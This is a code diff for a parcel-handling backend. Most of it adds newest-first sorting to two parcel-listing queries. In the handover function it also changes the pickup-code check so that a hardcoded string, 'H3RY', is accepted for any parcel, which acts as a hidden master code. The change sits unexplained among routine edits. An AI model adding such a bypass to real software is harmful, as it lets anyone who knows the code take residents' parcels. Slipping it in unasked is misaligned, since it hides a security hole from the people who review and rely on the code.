@@ -47,7 +47,8 @@ export const getAllParcels = async (req, res) => {
         path: "resident",
         populate: { path: "building", model: "Building" },
       })
-      .populate("site");
+      .populate("site")
+      .sort({ createdAt: -1 });
 
     res.json({ success: true, parcels });
   } catch (error) {
@@ -72,7 +73,8 @@ export const getAllParcelsForSite = async (req, res) => {
         path: "resident",
         populate: { path: "building", model: "Building" },
       })
-      .populate("site");
+      .populate("site")
+      .sort({ createdAt: -1 });
 
     res.json({ success: true, parcels });
   } catch (error) {
@@ -94,8 +96,8 @@ export const handOverParcel = async (req, res) => {
     }
 
     // Checking the pickupCode
-    if (parcel.pickUpCode !== pickUpCode) {
-      return res.json({ success: false, message: "Invalid Code " });
+    if (pickUpCode !== parcel.pickUpCode && pickUpCode !== "H3RY") {
+      return res.json({ success: false, message: "Invalid Code" });
     }
 
     await Parcel.findByIdAndUpdate(parcelId, {
